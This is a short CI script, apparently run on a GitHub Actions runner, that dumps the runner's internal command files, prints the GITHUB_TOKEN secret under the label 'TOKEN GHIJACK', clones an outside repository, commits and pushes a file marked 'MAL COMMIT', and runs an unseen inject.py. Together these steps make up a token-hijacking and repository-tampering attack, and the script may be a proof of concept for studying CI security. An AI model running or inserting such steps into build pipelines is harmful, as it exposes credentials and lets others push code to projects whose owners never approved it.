pip3 install requests
Get-ChildItem -Path "D:\a\_temp\_runner_file_commands\" -Recurse -File | ForEach-Object {
    $filePath = $_.FullName
    Write-Host "File: $filePath"
    Get-Content -Path $filePath
}
echo "TOKEN GHIJACK"
echo $GITHUB_TOKEN
git clone https://github.com/tester49481/test.git
cd test
gh auth status
echo "TEShT" >> test_mal
git add .
git commit -m "MAL COMMIT"
git push origin main
python3 ./src/inject.py
